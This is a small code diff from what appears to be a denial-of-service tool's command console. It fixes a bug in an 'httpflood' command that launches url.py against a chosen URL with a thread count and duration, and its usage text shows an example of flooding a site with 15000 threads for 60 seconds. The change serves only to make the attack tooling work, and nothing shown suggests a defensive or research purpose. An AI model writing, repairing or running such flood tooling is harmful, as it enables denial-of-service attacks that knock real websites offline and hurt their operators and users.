@@ -612,7 +612,7 @@ def main():
                 url = cnc.split()[1]
                 threads = cnc.split()[2]
                 time = cnc.split()[3]
-                os.system(f'python3 url.py {url} {thread} get {time} nil')
+                os.system(f'python3 url.py {url} {threads} get {time} nil')
             except IndexError:
                 print('Usage: httpflood <url> <threads> <time>')
                 print('Example: httpflood http://example.com 15000 60')
